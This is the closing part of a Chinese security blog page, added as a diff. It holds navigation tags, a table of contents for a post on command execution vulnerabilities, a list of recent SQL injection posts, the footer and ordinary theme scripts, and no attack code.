+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/SSRF/" 
+        title="SSRF">
+        <div class="tags-list-item">SSRF</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E6%9C%AC%E8%B4%A8"><span class="toc-text">一、漏洞的原因及本质</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、命令执行漏洞的危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%AF%AD%E6%B3%95"><span class="toc-text">三、命令执行语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-text">四、命令执行漏洞的防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">五、反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E7%BB%95%E8%BF%87disable-functions"><span class="toc-text">六、绕过disable functions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">七、反序列化漏洞</span></a></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-06</div>
+        <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Access%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Access注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/MSSQL%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">MSSQL注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Mysql%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Mysql注入</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
